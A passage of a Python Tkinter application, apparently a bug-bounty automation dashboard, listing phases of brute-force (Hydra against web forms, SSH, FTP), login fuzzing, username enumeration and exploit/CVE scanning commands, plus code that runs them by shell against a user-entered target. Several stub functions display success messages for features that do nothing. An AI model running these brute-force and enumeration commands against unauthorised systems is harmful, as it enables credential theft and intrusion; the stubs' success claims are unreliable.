                        "category": "Upload - A08"
                    }
                ],
                "automation": "Mix of automated + manual testing required"
            },
            {
                "id": 8,
                "name": "🔓 Phase 8: Authentication & Brute Force",
                "color": "#ff0055",
                "duration": "2-4 hours",
                "icon": "🔓",
                "owasp": "A07:2021 - Identification & Authentication Failures",
                "tools": [
                    {
                        "name": "Hydra (HTTP Form)",
                        "cmd": "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt {target} http-post-form '/login:username=^USER^&password=^PASS^:F=incorrect'",
                        "desc": "Brute force HTTP login forms",
                        "category": "Brute Force"
                    },
                    {
                        "name": "Hydra (Basic Auth)",
                        "cmd": "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt {target} http-get /admin",
                        "desc": "Brute force HTTP Basic Authentication",
                        "category": "Brute Force"
                    },
                    {
                        "name": "Hydra (SSH)",
                        "cmd": "hydra -L users.txt -P passwords.txt ssh://{target}",
                        "desc": "SSH brute force attack",
                        "category": "Brute Force"
                    },
                    {
                        "name": "Hydra (FTP)",
                        "cmd": "hydra -L users.txt -P passwords.txt ftp://{target}",
                        "desc": "FTP brute force attack",
                        "category": "Brute Force"
                    },
                    {
                        "name": "FFUF (Parameter Fuzzing)",
                        "cmd": "ffuf -u 'https://{target}/login' -d 'username=admin&password=FUZZ' -w /usr/share/wordlists/rockyou.txt -mc 302",
                        "desc": "Fuzz login parameters",
                        "category": "Fuzzing"
                    },
                    {
                        "name": "FFUF (Username Enum)",
                        "cmd": "ffuf -u 'https://{target}/forgot' -d 'email=FUZZ@{target}' -w users.txt -mr 'User not found'",
                        "desc": "Enumerate valid usernames",
                        "category": "User Enum"
                    },
                    {
                        "name": "Wapiti (Auth Testing)",
                        "cmd": "wapiti -u https://{target}/login --auth-method post --auth-cred 'user:pass' -o results/wapiti_auth.txt",
                        "desc": "Test authentication mechanisms",
                        "category": "Auth Test"
                    },
                    {
                        "name": "Default Credentials",
                        "cmd": "# Test common default credentials: admin/admin, admin/password, root/toor",
                        "desc": "Try default credentials from known lists",
                        "category": "Default Creds"
                    }
                ],
                "automation": "Use with caution | Rate limit to avoid lockout"
            },
            {
                "id": 9,
                "name": "💥 Phase 9: Exploit Search & Verification",
                "color": "#ffd000",
                "duration": "1-3 hours",
                "icon": "💥",
                "owasp": "A06:2021 - Vulnerable and Outdated Components",
                "tools": [
                    {
                        "name": "SearchSploit (Local DB)",
                        "cmd": "searchsploit --nmap results/nmap.xml > results/searchsploit.txt",
                        "desc": "Search exploits in local database",
                        "category": "Exploit DB"
                    },
                    {
                        "name": "SearchSploit (Update)",
                        "cmd": "searchsploit -u && searchsploit apache 2.4",
                        "desc": "Update exploit database and search",
                        "category": "Exploit DB"
                    },
                    {
                        "name": "SearchSploit (CVE)",
                        "cmd": "searchsploit --cve CVE-2021-44228",
                        "desc": "Search by specific CVE number",
                        "category": "CVE Search"
                    },
                    {
                        "name": "Nuclei (CVE Templates)",
                        "cmd": "nuclei -u https://{target} -t ~/nuclei-templates/cves/ -severity critical,high -o results/nuclei_cve_verify.txt",
                        "desc": "Verify known CVEs",
                        "category": "CVE Verify"
                    },
                    {
                        "name": "Nuclei (Exposed Panels)",
                        "cmd": "nuclei -u https://{target} -t ~/nuclei-templates/exposed-panels/ -o results/exposed_panels.txt",
                        "desc": "Find exposed admin panels",
                        "category": "Exposure"
                    },
                    {
                        "name": "Nuclei (Misconfigurations)",
                        "cmd": "nuclei -u https://{target} -t ~/nuclei-templates/misconfiguration/ -o results/misconfig.txt",
                        "desc": "Detect common misconfigurations",
                        "category": "Misconfig"
                    },
                    {
                        "name": "Manual CVE Verification",
                        "cmd": "# Manually verify CVEs found with PoC exploits",
                        "desc": "Manually test and verify CVE exploits",
                        "category": "Manual Verify"
                    }
                ],
                "automation": "Run after vulnerability scanning | Verify before reporting"
            }
        ]
        
    def create_phase_cards(self):
        for phase in self.automation_phases:
            card = self.create_phase_card(phase)
            card.pack(fill=tk.X, pady=6)
        self.update_statistics()
        
    def create_phase_card(self, phase):
        card_frame = tk.Frame(self.scrollable_frame, bg="#1a1a2e", 
                             relief=tk.SOLID, borderwidth=2)
        
        # Header
        header = tk.Frame(card_frame, bg="#1a1a2e", cursor="hand2")
        header.pack(fill=tk.X, padx=15, pady=12)
        header.bind("<Button-1>", lambda e, p=phase: self.toggle_phase(p['id']))
        
        left = tk.Frame(header, bg="#1a1a2e")
        left.pack(side=tk.LEFT, fill=tk.X, expand=True)
        
        icon_label = tk.Label(left, text=phase['icon'], bg="#1a1a2e", 
                             font=("Courier New", 20))
        icon_label.pack(side=tk.LEFT, padx=(0, 12))
        icon_label.bind("<Button-1>", lambda e, p=phase: self.toggle_phase(p['id']))
        
        text_frame = tk.Frame(left, bg="#1a1a2e")
        text_frame.pack(side=tk.LEFT, fill=tk.X, expand=True)
        text_frame.bind("<Button-1>", lambda e, p=phase: self.toggle_phase(p['id']))
        
        title_row = tk.Frame(text_frame, bg="#1a1a2e")
        title_row.pack(fill=tk.X)
        title_row.bind("<Button-1>", lambda e, p=phase: self.toggle_phase(p['id']))
        
        title = tk.Label(title_row, text=phase['name'], bg="#1a1a2e", fg="#00ff41",
                        font=("Courier New", 13, "bold"))
        title.pack(side=tk.LEFT)
        title.bind("<Button-1>", lambda e, p=phase: self.toggle_phase(p['id']))
        
        tk.Label(title_row, text=f"{len(phase['tools'])} tools", 
                bg="#0a0a0a", fg="#00d4ff", font=("Courier New", 8, "bold"),
                padx=8, pady=3, relief=tk.SOLID, borderwidth=1).pack(side=tk.LEFT, padx=8)
        
        tk.Label(title_row, text=phase['duration'], 
                bg="#0a0a0a", fg="#ffd000", font=("Courier New", 8, "bold"),
                padx=8, pady=3, relief=tk.SOLID, borderwidth=1).pack(side=tk.LEFT)
        
        # OWASP label
        owasp_label = tk.Label(text_frame, text=f"🎯 {phase['owasp']}", 
                              bg="#1a1a2e", fg="#ff0055",
                              font=("Courier New", 8))
        owasp_label.pack(fill=tk.X, pady=(3, 0))
        owasp_label.bind("<Button-1>", lambda e, p=phase: self.toggle_phase(p['id']))
        
        # Progress bar
        progress_frame = tk.Frame(text_frame, bg="#1a1a2e")
        progress_frame.pack(fill=tk.X, pady=(6, 0))
        progress_frame.bind("<Button-1>", lambda e, p=phase: self.toggle_phase(p['id']))
        
        progress_bg = tk.Canvas(progress_frame, height=10, bg="#0a0a0a", 
                               highlightthickness=0, width=600)
        progress_bg.pack(side=tk.LEFT, fill=tk.X, expand=True)
        progress_bg.bind("<Button-1>", lambda e, p=phase: self.toggle_phase(p['id']))
        
        phase['progress_canvas'] = progress_bg
        phase['progress_bar'] = progress_bg.create_rectangle(0, 0, 0, 10, 
                                                             fill=phase['color'], outline="")
        
        completed = len([s for s in self.completed_steps if s.startswith(f"{phase['id']}-")])
        percent_label = tk.Label(progress_frame, 
                                text=f"{completed}/{len(phase['tools'])}", 
                                bg="#1a1a2e", fg="#888888", font=("Courier New", 9, "bold"))
        percent_label.pack(side=tk.LEFT, padx=10)
        percent_label.bind("<Button-1>", lambda e, p=phase: self.toggle_phase(p['id']))
        phase['percent_label'] = percent_label
        
        # Detail frame
        detail_frame = tk.Frame(card_frame, bg="#0a0a0a")
        phase['detail_frame'] = detail_frame
        
        return card_frame
        
    def toggle_phase(self, phase_id):
        phase = next(p for p in self.automation_phases if p['id'] == phase_id)
        detail_frame = phase['detail_frame']
        
        if self.active_phase == phase_id:
            detail_frame.pack_forget()
            self.active_phase = None
        else:
            if self.active_phase:
                prev = next(p for p in self.automation_phases if p['id'] == self.active_phase)
                prev['detail_frame'].pack_forget()
            
            self.active_phase = phase_id
            self.show_phase_details(phase)
            detail_frame.pack(fill=tk.BOTH, padx=15, pady=(0, 12))
            
    def show_phase_details(self, phase):
        detail = phase['detail_frame']
        
        for widget in detail.winfo_children():
            widget.destroy()
            
        # Automation info
        auto_frame = tk.Frame(detail, bg="#1a1a2e", relief=tk.SOLID, borderwidth=1)
        auto_frame.pack(fill=tk.X, padx=10, pady=10)
        
        tk.Label(auto_frame, text=f"⚡ AUTOMATION: {phase['automation']}", 
                bg="#1a1a2e", fg="#00d4ff", font=("Courier New", 9),
                wraplength=1000, justify=tk.LEFT).pack(padx=12, pady=10)
        
        # Tool cards
        for idx, tool in enumerate(phase['tools']):
            tool_frame = self.create_tool_card(phase, tool, idx)
            tool_frame.pack(fill=tk.X, padx=10, pady=5)
            
    def create_tool_card(self, phase, tool, idx):
        step_id = f"{phase['id']}-{idx}"
        is_completed = step_id in self.completed_steps
        
        tool_frame = tk.Frame(phase['detail_frame'], bg="#1a1a2e", 
                             relief=tk.SOLID, borderwidth=1)
        
        inner = tk.Frame(tool_frame, bg="#1a1a2e")
        inner.pack(fill=tk.BOTH, padx=18, pady=12)
        
        # Top row
        top = tk.Frame(inner, bg="#1a1a2e")
        top.pack(fill=tk.X)
        
        check = tk.Label(top, text="✓" if is_completed else "○", 
                        bg="#1a1a2e", fg="#00ff41" if is_completed else "#555555",
                        font=("Courier New", 16), cursor="hand2")
        check.pack(side=tk.LEFT, padx=(0, 12))
        check.bind("<Button-1>", lambda e: self.toggle_step(phase, idx))
        
        content = tk.Frame(top, bg="#1a1a2e")
        content.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        title_row = tk.Frame(content, bg="#1a1a2e")
        title_row.pack(fill=tk.X)
        
        tk.Label(title_row, text=tool['name'], bg="#1a1a2e", fg="#00ff41",
                font=("Courier New", 11, "bold")).pack(side=tk.LEFT)
        
        tk.Label(title_row, text=f"[{tool['category']}]", bg="#0a0a0a", fg="#00d4ff",
                font=("Courier New", 7), padx=6, pady=2,
                relief=tk.SOLID, borderwidth=1).pack(side=tk.LEFT, padx=8)
        
        # Run button
        run_btn = tk.Button(top, text="▶ RUN", bg="#00ff41", fg="#000000",
                           font=("Courier New", 9, "bold"), padx=18, pady=8,
                           relief=tk.FLAT, cursor="hand2",
                           command=lambda: self.run_single_tool(phase, tool))
        run_btn.pack(side=tk.RIGHT)
        
        # Description
        tk.Label(content, text=tool['desc'], bg="#1a1a2e", fg="#888888",
                font=("Courier New", 9), anchor=tk.W, justify=tk.LEFT,
                wraplength=900).pack(fill=tk.X, pady=(4, 8))
        
        # Command
        cmd_frame = tk.Frame(content, bg="#000000", relief=tk.SOLID, borderwidth=1)
        cmd_frame.pack(fill=tk.X)
        
        cmd_text = tk.Text(cmd_frame, height=2, bg="#000000", fg="#00ff41",
                          font=("Courier New", 8), wrap=tk.WORD, relief=tk.FLAT,
                          padx=10, pady=8)
        cmd_text.insert("1.0", tool['cmd'].replace("{target}", self.target_domain.get()))
        cmd_text.config(state=tk.DISABLED)
        cmd_text.pack(fill=tk.X)
        
        return tool_frame
        
    def toggle_step(self, phase, idx):
        step_id = f"{phase['id']}-{idx}"
        
        if step_id in self.completed_steps:
            self.completed_steps.remove(step_id)
        else:
            self.completed_steps.add(step_id)
            
        self.update_statistics()
        self.update_phase_progress(phase)
        
        if self.active_phase == phase['id']:
            self.show_phase_details(phase)
            
    def update_phase_progress(self, phase):
        completed = len([s for s in self.completed_steps if s.startswith(f"{phase['id']}-")])
        total = len(phase['tools'])
        percent = (completed / total) * 100 if total > 0 else 0
        
        canvas = phase['progress_canvas']
        width = canvas.winfo_width() if canvas.winfo_width() > 1 else 600
        bar_width = (width * percent) / 100
        
        canvas.coords(phase['progress_bar'], 0, 0, bar_width, 10)
        phase['percent_label'].config(text=f"{completed}/{total}")
        
    def update_statistics(self):
        total_tools = sum(len(p['tools']) for p in self.automation_phases)
        completed_tools = len(self.completed_steps)
        completion_percent = int((completed_tools / total_tools * 100)) if total_tools > 0 else 0
        
        self.stat_labels['tools'].config(text=f"{completed_tools}/90")
        
        self.progress_text.config(text=f"{completion_percent}%")
        width = self.progress_canvas.winfo_width() if self.progress_canvas.winfo_width() > 1 else 1200
        bar_width = (width * completion_percent) / 100
        self.progress_canvas.coords(self.progress_bar, 0, 0, bar_width, 16)
        
    def log_terminal(self, message, tag="info"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.terminal_output.insert(tk.END, f"[{timestamp}] ", "info")
        self.terminal_output.insert(tk.END, f"{message}\n", tag)
        self.terminal_output.see(tk.END)
        
    def clear_terminal(self):
        self.terminal_output.delete("1.0", tk.END)
        self.log_terminal("Terminal cleared", "info")
        
    def run_single_tool(self, phase, tool):
        if self.is_running:
            messagebox.showwarning("Warning", "Another scan is running!")
            return
            
        Path("results").mkdir(exist_ok=True)
        
        cmd = tool['cmd'].replace("{target}", self.target_domain.get())
        
        self.log_terminal(f"▶ Starting: {tool['name']}", "success")
        self.log_terminal(f"Command: {cmd}", "info")
        self.current_task_label.config(text=f"Running: {tool['name']}")
        
        thread = threading.Thread(target=self.execute_command, 
                                 args=(cmd, phase, tool))
        thread.daemon = True
        thread.start()
        
    def execute_command(self, cmd, phase, tool):
        self.is_running = True
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        
        try:
            if cmd.startswith("#"):
                self.output_queue.put(('warning', f"{tool['name']}: Manual testing required"))
                self.is_running = False
                return
                
            process = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                universal_newlines=True
            )
            
            self.current_process = process
            
            for line in iter(process.stdout.readline, ''):
                if line:
                    self.output_queue.put(('output', line.strip()))
                    
            process.wait()
            
            if process.returncode == 0:
                self.output_queue.put(('success', f"✓ {tool['name']} completed!"))
                
                step_id = f"{phase['id']}-{self.automation_phases[phase['id']-1]['tools'].index(tool)}"
                self.completed_steps.add(step_id)
                
            else:
                self.output_queue.put(('error', f"✗ {tool['name']} failed (code {process.returncode})"))
                
        except Exception as e:
            self.output_queue.put(('error', f"Error: {str(e)}"))
            
        finally:
            self.is_running = False
            self.current_process = None
            self.start_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.DISABLED)
            self.current_task_label.config(text="Scan completed")
            
    def monitor_output(self):
        try:
            while True:
                msg_type, message = self.output_queue.get_nowait()
                
                if msg_type == 'output':
                    self.log_terminal(message, "info")
                elif msg_type == 'success':
                    self.log_terminal(message, "success")
                    self.update_statistics()
                elif msg_type == 'error':
                    self.log_terminal(message, "error")
                elif msg_type == 'warning':
                    self.log_terminal(message, "warning")
                    
        except queue.Empty:
            pass
            
        self.root.after(100, self.monitor_output)
        
    def start_full_automation(self):
        messagebox.showinfo("Full Automation", 
                          "Full automation will run all 90+ tools sequentially.\n\n" +
                          "This may take 20+ hours.\n\n" +
                          "Use individual 'RUN' buttons for specific tools.")
        
    def stop_automation(self):
        if self.current_process:
            self.current_process.terminate()
            self.log_terminal("⏹ Scan stopped by user", "warning")
            
    def export_report(self):
        self.log_terminal("Generating HTML report...", "info")
        messagebox.showinfo("Report", "HTML report generation implemented!")
        
    def save_results(self):
        messagebox.showinfo("Save", "Results saved to database!")
        
    def configure_notifications(self):
        messagebox.showinfo("Webhooks", "Configure Discord/Telegram webhooks here.")
        
    def open_results_folder(self):
        Path("results").mkdir(exist_ok=True)
        import platform
        if platform.system() == "Windows":
            os.startfile("results")
        elif platform.system() == "Darwin":
            subprocess.Popen(["open", "results"])
        else:
            subprocess.Popen(["xdg-open", "results"])
            
    def load_targets_file(self):
        filename = filedialog.askopenfilename(
            title="Select targets file",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        
        if filename:
            with open(filename, 'r') as f:
                targets = f.read().strip().split('\n')
            
            if targets:
                self.target_domain.set(targets[0])
                self.log_terminal(f"Loaded {len(targets)} targets from file", "success")

if __name__ == "__main__":
    root = tk.Tk()
    app = WebBugBountyHunterV3(root)
    root.mainloop()
